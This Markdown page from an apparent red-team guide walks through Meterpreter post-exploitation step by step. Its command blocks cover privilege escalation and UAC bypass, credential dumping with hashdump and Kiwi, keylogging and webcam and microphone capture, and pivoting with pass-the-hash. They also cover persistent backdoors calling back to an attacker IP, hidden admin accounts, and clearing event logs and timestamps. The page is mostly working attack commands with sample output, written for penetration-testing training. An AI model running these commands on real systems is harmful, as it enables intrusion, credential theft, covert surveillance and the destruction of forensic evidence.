<div align="center">

| Previous Page | Final  Phase |
|:-------------------------------------------:|:-------------------------------------------:|
| [Post-Exploitation Page](5.0-Post-Exploitation.md) | [Reporting Page](../6-Reporting/Reporting.md) | 

</div>

<br>
<br>

## Tools Reference Table

<br>

<p align=center>

| Tool | Category | Purpose | Link |
|:-----|:---------|:--------|:-----|
| [**Meterpreter**](#meterpreter) | Multi-Purpose | Post-exploitation framework (Metasploit payload) | [metasploit.com](https://www.metasploit.com/) |

</p>

<br>

> **External References:**
> * [**Mimikatz**](https://github.com/gentilkiwi/mimikatz) - Tool for extracting plaintexts, hashes, PINs, and Kerberos tickets from memory.
> * [**Chisel**](https://github.com/jpillora/chisel) - A fast TCP/UDP tunnel over HTTP, ideal for firewalled environments.
> * [**Ligolo-ng**](https://github.com/nicocha30/ligolo-ng) - Advanced tunneling tool that uses TUN interfaces for easier pivoting.
> * [**PayloadAllTheThings**](https://github.com/swisskyrepo/PayloadsAllTheThings) - A massive collection of payloads for persistence, reverse shells, and data exfiltration.

<br>
<br>


# Meterpreter
> *Part of: [Metasploit Framework](https://www.metasploit.com/)*

Meterpreter (Meta-Interpreter) is an advanced, dynamically extensible payload within the Metasploit Framework. It runs entirely in memory (no disk writes), communicates over encrypted channels, and provides a powerful command interface for post-exploitation activities. Meterpreter can handle privilege escalation, credential harvesting, pivoting, persistence, and evidence removal all from a single shell.


## Why Meterpreter?

<p align="center">

| Feature | Benefit |
|:--------|:--------|
| **In-Memory Execution** | Runs entirely in RAM - no files written to disk (evades AV) |
| **Encrypted Communication** | TLS/SSL encrypted channel to C2 server |
| **Reflective DLL Injection** | Injects into processes without touching disk |
| **Extensible** | Load additional modules on-the-fly |
| **Cross-Platform** | Windows, Linux, macOS, Android, PHP, Java, Python |
| **Integrated with Metasploit** | Full access to post-exploitation modules |

</p>

<br>

## Meterpreter Variants

<p align="center">

| Payload | Target | Use Case |
|:--------|:-------|:---------|
| `windows/meterpreter/reverse_tcp` | Windows | Standard reverse shell |
| `windows/x64/meterpreter/reverse_tcp` | Windows x64 | 64-bit systems |
| `windows/meterpreter/reverse_https` | Windows | HTTPS encrypted (bypasses firewalls) |
| `linux/x86/meterpreter/reverse_tcp` | Linux | Linux systems |
| `php/meterpreter/reverse_tcp` | Web Servers | PHP-based shells |
| `java/meterpreter/reverse_tcp` | Java Apps | Java environments |
| `android/meterpreter/reverse_tcp` | Android | Mobile devices |

</p>

<br>

<br>

## 1. Privilege Escalation

Elevating from a low-privileged user to `SYSTEM` (Windows) or `root` (Linux) to gain full control.


### Use Cases for Red Team

<p align="center">

| Use Case | What to Look For |
|:---------|:-----------------|
| **Automatic Escalation** | - Use `getsystem` for quick SYSTEM access<br> - Token impersonation techniques<br> - Named pipe impersonation |
| **UAC Bypass** | - Bypass User Account Control prompts<br> - Exploit auto-elevate binaries<br> - Registry manipulation |
| **Token Manipulation** | - Steal tokens from privileged processes<br> - Impersonate logged-in users<br> - Delegate tokens for lateral movement |
| **Local Exploit Suggester** | - Identify missing patches<br> - Suggest kernel exploits<br> - CVE-based escalation |

</p>

### Practical Usage

```bash
# ========================================= #
#          AUTOMATIC ESCALATION             #
# ========================================= #

# == Check current privileges == #
meterpreter > getuid
Server username: VICTIM\lowuser

meterpreter > getprivs
# Shows current token privileges

# == Attempt automatic SYSTEM escalation == #
meterpreter > getsystem
# Tries multiple techniques:
# 1. Named Pipe Impersonation (In Memory/Admin)
# 2. Named Pipe Impersonation (Dropper/Admin)
# 3. Token Duplication (In Memory/Admin)

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

# ========================================= #
#             UAC BYPASS                    #
# ========================================= #

# == Background session first == #
meterpreter > background

# == Use UAC bypass module == #
msf6 > use exploit/windows/local/bypassuac_eventvwr
msf6 > set SESSION 1
msf6 > set LHOST <attacker_ip>
msf6 > run

# == Alternative UAC bypasses == #
msf6 > use exploit/windows/local/bypassuac_fodhelper
msf6 > use exploit/windows/local/bypassuac_sluihijack

# ========================================= #
#          TOKEN MANIPULATION               #
# ========================================= #

# == List available tokens == #
meterpreter > use incognito
meterpreter > list_tokens -u

# Delegation Tokens Available:
# VICTIM\Administrator
# NT AUTHORITY\SYSTEM

# == Impersonate a token == #
meterpreter > impersonate_token "VICTIM\\Administrator"
meterpreter > getuid
Server username: VICTIM\Administrator

# ========================================= #
#       LOCAL EXPLOIT SUGGESTER             #
# ========================================= #

# == Find kernel exploits == #
meterpreter > background
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set SESSION 1
msf6 > run

# Example output:
# [+] exploit/windows/local/ms16_032_secondary_logon_handle_privesc
# [+] exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move

# == Run suggested exploit == #
msf6 > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
msf6 > set SESSION 1
msf6 > run
```

<br>


## 2. Gathering Information (Local Recon)

Extracting credentials, system information, and mapping the internal network.


### Use Cases for Red Team

<p align="center">

| Use Case | What to Look For |
|:---------|:-----------------|
| **Credential Harvesting** | - SAM database hashes<br> - Cached domain credentials<br> - Browser saved passwords |
| **System Enumeration** | - Installed software versions<br> - Running processes<br> - Network configuration |
| **Keylogging** | - Capture keystrokes in real-time<br> - Harvest typed passwords<br> - Monitor user activity |
| **Screenshot/Webcam** | - Visual reconnaissance<br> - Sensitive data on screen<br> - Physical environment awareness |

</p>

### Practical Usage

```bash
# ========================================= #
#         CREDENTIAL HARVESTING             #
# ========================================= #

# == Dump SAM database hashes == #
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# == Load Kiwi (Mimikatz) == #
meterpreter > load kiwi

# == Dump all credentials == #
meterpreter > creds_all

# == Dump specific credential types == #
meterpreter > creds_msv      # NTLM hashes
meterpreter > creds_wdigest  # Cleartext passwords (if available)
meterpreter > creds_kerberos # Kerberos tickets
meterpreter > creds_ssp      # SSP credentials
meterpreter > creds_tspkg    # TsPkg credentials

# == LSA secrets == #
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets

# ========================================= #
#         SYSTEM ENUMERATION                #
# ========================================= #

# == System information == #
meterpreter > sysinfo
Computer        : VICTIM-PC
OS              : Windows 10 (10.0 Build 19041)
Architecture    : x64
Meterpreter     : x64/windows

# == Network information == #
meterpreter > ipconfig
meterpreter > route
meterpreter > arp

# == Running processes == #
meterpreter > ps

# == Current user info == #
meterpreter > getuid
meterpreter > getprivs

# == Installed applications == #
meterpreter > run post/windows/gather/enum_applications

# == Logged on users == #
meterpreter > run post/windows/gather/enum_logged_on_users

# ========================================= #
#           KEYLOGGING                      #
# ========================================= #

# == Start keylogger == #
meterpreter > keyscan_start
Starting the keystroke sniffer...

# == Dump captured keystrokes == #
meterpreter > keyscan_dump
Dumping captured keystrokes...
admin<Tab>P@ssw0rd123<CR>

# == Stop keylogger == #
meterpreter > keyscan_stop

# ========================================= #
#        SCREENSHOT & WEBCAM                #
# ========================================= #

# == Take screenshot == #
meterpreter > screenshot
Screenshot saved to: /root/screenshot.jpeg

# == Start webcam == #
meterpreter > webcam_list
meterpreter > webcam_snap
meterpreter > webcam_stream

# == Record microphone == #
meterpreter > record_mic -d 30

# ========================================= #
#         FILE OPERATIONS                   #
# ========================================= #

# == Search for files == #
meterpreter > search -f *.txt
meterpreter > search -f password*
meterpreter > search -f *.kdbx  # KeePass databases
meterpreter > search -f id_rsa  # SSH keys

# == Download files == #
meterpreter > download "C:\\Users\\Admin\\Documents\\secrets.docx"

# == Upload files == #
meterpreter > upload /root/tools/mimikatz.exe "C:\\Windows\\Temp\\"
```

<br>

## 3. Lateral Movement

Using the compromised machine as a pivot point to attack other systems on the internal network.


### Use Cases for Red Team

<p align="center">

| Use Case | What to Look For |
|:---------|:-----------------|
| **Port Forwarding** | - Access internal services through victim<br> - Reach restricted network segments<br> - Bypass firewall rules |
| **Pivoting/Routing** | - Route all Metasploit traffic through victim<br> - Scan internal networks<br> - Attack multiple internal targets |
| **SOCKS Proxy** | - Use external tools (Nmap, Burp) through pivot<br> - Browser access to internal web apps<br> - Full network access |
| **Pass-the-Hash** | - Authenticate without cracking passwords<br> - Move to other Windows systems<br> - Access network shares |

</p>

### Practical Usage

```bash
# ========================================= #
#           PORT FORWARDING                 #
# ========================================= #

# == Local port forward == #
# Access victim's internal port from attacker
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.100
# Now: localhost:8080 -> 192.168.1.100:80 (through victim)

# == Remote port forward == #
# Expose attacker's port to victim's network
meterpreter > portfwd add -R -l 4444 -p 4444 -L 0.0.0.0

# == List port forwards == #
meterpreter > portfwd list

# == Delete port forward == #
meterpreter > portfwd delete -l 8080 -p 80 -r 192.168.1.100
meterpreter > portfwd flush  # Delete all

# ========================================= #
#         AUTOROUTE (PIVOTING)              #
# ========================================= #

# == View victim's network interfaces == #
meterpreter > ipconfig
# Interface 2: 10.0.0.5 (Internal network we want to reach)

# == Add route through session == #
meterpreter > run autoroute -s 10.0.0.0/24

# == Or from msfconsole == #
meterpreter > background
msf6 > use post/multi/manage/autoroute
msf6 > set SESSION 1
msf6 > set SUBNET 10.0.0.0
msf6 > set NETMASK /24
msf6 > run

# == Verify routes == #
msf6 > route print

# == Now scan internal network through pivot == #
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 10.0.0.1-254
msf6 > set PORTS 22,80,443,445,3389
msf6 > run

# ========================================= #
#           SOCKS PROXY                     #
# ========================================= #

# == Start SOCKS proxy server == #
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > set VERSION 5
msf6 > run -j

# == Configure proxychains == #
# Edit /etc/proxychains4.conf:
# socks5 127.0.0.1 1080

# == Use external tools through proxy == #
proxychains nmap -sT -Pn 10.0.0.100
proxychains curl http://10.0.0.100
proxychains evil-winrm -i 10.0.0.100 -u admin -p password

# ========================================= #
#           PASS-THE-HASH                   #
# ========================================= #

# == With Meterpreter/Metasploit == #
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS 10.0.0.100
msf6 > set SMBUser Administrator
msf6 > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST <attacker_ip>
msf6 > run

# == Alternative: WMI Execution == #
msf6 > use exploit/windows/local/wmi_persistence
```

<br>

## 4. Persistence

Ensuring continued access to the compromised system even after reboots or user logoffs.


### Use Cases for Red Team

<p align="center">

| Use Case | What to Look For |
|:---------|:-----------------|
| **Registry Persistence** | - Run/RunOnce keys<br> - Survives reboots<br> - User-level or SYSTEM-level |
| **Scheduled Tasks** | - Execute payload at intervals<br> - Trigger on events (login, startup)<br> - Stealthy naming |
| **Service Installation** | - Runs as SYSTEM<br> - Automatic startup<br> - Survives reboots |
| **Backdoor User** | - Create hidden admin account<br> - RDP access<br> - Fallback access |

</p>

### Practical Usage

```bash
# ========================================= #
#         METERPRETER PERSISTENCE           #
# ========================================= #

# == Automatic persistence script == #
meterpreter > run persistence -h

# == Install persistent backdoor == #
meterpreter > run persistence -U -i 30 -p 4444 -r <attacker_ip>
# -U = Run at user login
# -i = Connection interval (seconds)
# -p = Port to connect back
# -r = Attacker IP

# == Or use post module == #
meterpreter > background
msf6 > use exploit/windows/local/persistence_service
msf6 > set SESSION 1
msf6 > set LHOST <attacker_ip>
msf6 > set LPORT 5555
msf6 > run

# ========================================= #
#         REGISTRY PERSISTENCE              #
# ========================================= #

# == Add to Registry Run key == #
meterpreter > reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Updater -d "C:\\Windows\\Temp\\payload.exe"

# == Verify == #
meterpreter > reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Updater

# == Using post module == #
msf6 > use post/windows/manage/persistence_exe
msf6 > set SESSION 1
msf6 > set REXEPATH /root/payload.exe
msf6 > set STARTUP SYSTEM
msf6 > run

# ========================================= #
#          SCHEDULED TASKS                  #
# ========================================= #

# == Create scheduled task (from Meterpreter shell) == #
meterpreter > shell
C:\> schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\payload.exe" /sc onlogon /ru SYSTEM

# == Verify task == #
C:\> schtasks /query /tn "WindowsUpdate"

# == Using post module == #
msf6 > use post/windows/manage/schtaskabuse
msf6 > set SESSION 1
msf6 > set CMD "C:\\Windows\\Temp\\payload.exe"
msf6 > run

# ========================================= #
#          SERVICE PERSISTENCE              #
# ========================================= #

# == Create malicious service == #
meterpreter > shell
C:\> sc create "WindowsUpdateSvc" binPath= "C:\Windows\Temp\payload.exe" start= auto
C:\> sc start WindowsUpdateSvc

# == Using Meterpreter module == #
msf6 > use exploit/windows/local/persistence_service
msf6 > set SESSION 1
msf6 > set SERVICE_NAME "WinUpdateSvc"
msf6 > run

# ========================================= #
#         BACKDOOR USER ACCOUNT             #
# ========================================= #

# == Create hidden admin user == #
meterpreter > shell
C:\> net user support$ P@ssw0rd123! /add
C:\> net localgroup Administrators support$ /add

# == Hide from login screen (optional) == #
C:\> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v support$ /t REG_DWORD /d 0 /f

# == Enable RDP == #
C:\> reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
C:\> netsh firewall set service remotedesktop enable
```

<br>

## 5. Removing Traces

Covering tracks to avoid detection and maintain stealth during and after the engagement.


### Use Cases for Red Team

<p align="center">

| Use Case | What to Look For |
|:---------|:-----------------|
| **Event Log Clearing** | - Clear Security, System, Application logs<br> - Remove evidence of login/execution<br> - Wipe PowerShell history |
| **Timestomping** | - Modify file creation/modification times<br> - Match legitimate system files<br> - Hide recently dropped tools |
| **File Deletion** | - Securely delete uploaded tools<br> - Remove artifacts<br> - Clear temp files |
| **Process Migration** | - Move to legitimate process<br> - Avoid suspicious process names<br> - Survive process termination |

</p>

### Practical Usage

```bash
# ========================================= #
#          EVENT LOG CLEARING               #
# ========================================= #

# == Clear all Windows event logs == #
meterpreter > clearev
[*] Wiping 1234 records from Application...
[*] Wiping 5678 records from System...
[*] Wiping 9012 records from Security...

# == Clear specific log (from shell) == #
meterpreter > shell
C:\> wevtutil cl Security
C:\> wevtutil cl System
C:\> wevtutil cl Application
C:\> wevtutil cl "Windows PowerShell"

# == Clear PowerShell history == #
C:\> Remove-Item (Get-PSReadlineOption).HistorySavePath
# Or
C:\> del %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# == Disable logging temporarily == #
C:\> auditpol /set /category:* /success:disable /failure:disable

# ========================================= #
#            TIMESTOMPING                   #
# ========================================= #

# == View file timestamps == #
meterpreter > timestomp "C:\\Windows\\Temp\\payload.exe" -v

# == Copy timestamps from legitimate file == #
meterpreter > timestomp "C:\\Windows\\Temp\\payload.exe" -f "C:\\Windows\\System32\\calc.exe"

# == Set specific timestamp == #
meterpreter > timestomp "C:\\Windows\\Temp\\payload.exe" -c "01/01/2020 12:00:00"
meterpreter > timestomp "C:\\Windows\\Temp\\payload.exe" -m "01/01/2020 12:00:00"
meterpreter > timestomp "C:\\Windows\\Temp\\payload.exe" -a "01/01/2020 12:00:00"

# == Blank all timestamps (suspicious!) == #
meterpreter > timestomp "C:\\Windows\\Temp\\payload.exe" -b

# ========================================= #
#           FILE DELETION                   #
# ========================================= #

# == Delete uploaded files == #
meterpreter > rm "C:\\Windows\\Temp\\mimikatz.exe"
meterpreter > rm "C:\\Windows\\Temp\\payload.exe"

# == Secure delete (overwrite) == #
meterpreter > shell
C:\> cipher /w:C:\Windows\Temp

# == Delete directory == #
meterpreter > rmdir "C:\\Windows\\Temp\\tools"

# ========================================= #
#         PROCESS MIGRATION                 #
# ========================================= #

# == List processes == #
meterpreter > ps

# == Find stable process to migrate to == #
# Good targets: explorer.exe, svchost.exe, lsass.exe (if SYSTEM)

# == Migrate to process == #
meterpreter > migrate <PID>
# Example: migrate to explorer.exe
meterpreter > migrate 1234

# == Auto-migrate on session creation == #
# Set in payload options:
msf6 > set AutoRunScript post/windows/manage/migrate

# ========================================= #
#         ADDITIONAL CLEANUP                #
# ========================================= #

# == Clear recent documents == #
meterpreter > shell
C:\> del /q %APPDATA%\Microsoft\Windows\Recent\*

# == Clear prefetch == #
C:\> del /q C:\Windows\Prefetch\*

# == Clear temp files == #
C:\> del /q %TEMP%\*
C:\> del /q C:\Windows\Temp\*
```

<br>

---

<br>
<br>

<div align="center">

| Previous Page | Final Phase |
|:-------------------------------------------:|:-------------------------------------------:|
| [Post-Exploitation Page](5.0-Post-Exploitation.md) | [Reporting Page](../6-Reporting/Reporting.md) | 

</div>